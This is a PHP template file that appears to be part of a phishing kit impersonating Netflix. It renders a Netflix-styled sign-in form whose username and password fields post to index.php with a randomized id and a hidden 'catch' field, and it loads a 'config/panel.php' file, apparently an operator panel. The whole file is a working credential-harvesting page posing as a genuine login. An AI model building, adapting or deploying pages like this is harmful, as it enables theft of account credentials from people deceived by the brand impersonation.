<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>

<div class="container carda d-flex flex-column justify-content-start align-items-center rounded-1 mt-3">
     <form class="w-100 d-flex flex-column justify-content-start align-items-start" method="post" action="index.php?id=<?= md5(time()) ?>">
     <input type="hidden" name="catch">
<h1><?= lang("xmain1"); ?></h1>
<div class="w-100 form-floating mb-3">
  <input name="user" type="text" class="form-control <?php if ($_SESSION['ERRORS']['user']) { echo 'is-invalid'; } ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xmain2"); ?></label>
  <div  class="invalid-feedback"><?= lang("xmain3"); ?></div>
</div>
<div class="w-100 form-floating mb-3">
  <input name="pass" type="password" class="form-control <?php if ($_SESSION['ERRORS']['pass']) { echo 'is-invalid'; } ?>" id="floatingInput" placeholder="name@example.com">
  <label  for="floatingInput"><?= lang("xmain4"); ?></label>
  <div  class="invalid-feedback"><?= lang("xmain5"); ?></div>
</div>
<button name="submit" type="submit" value="page1" class="btn btn-danger w-100"><?= lang("xmain6"); ?></button>
<div class="w-100 d-flex flex-row justify-content-between align-items-center">
    <div class="d-flex flex-row justify-content-start align-items-center">
        <img src="assets/images/screen.png" alt="" srcset="">
        <p style="color: #b3b3b3;font-size: 13px;font-weight: 400;" class="p-0 m-0"><?= lang("xmain7"); ?></p>
    </div>
    <div><p style="color: #b3b3b3;font-size: 13px;font-weight: 400;" class="p-0 m-0"><?= lang("xmain8"); ?></p></div>   
</div>
<div class="d-flex flex-row justify-content-start align-items-center mt-3">
    <p class="me-1" style="color: #737373;font-size: 16px;font-weight: 400;"><?= lang("xmain9"); ?></p>
    <p style="color: #fff;font-size:16px;"><?= lang("xmain10"); ?></p>
</div>
<div class="mb-5">
    <span style="color: #8c8c8c;font-size: 13px;"><?= lang("xmain11"); ?></span>
    <span style="color: #0071eb;font-size: 13px;"><?= lang("xmain12"); ?></span>
</div>
</form>
</div>

<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout.php' ?>


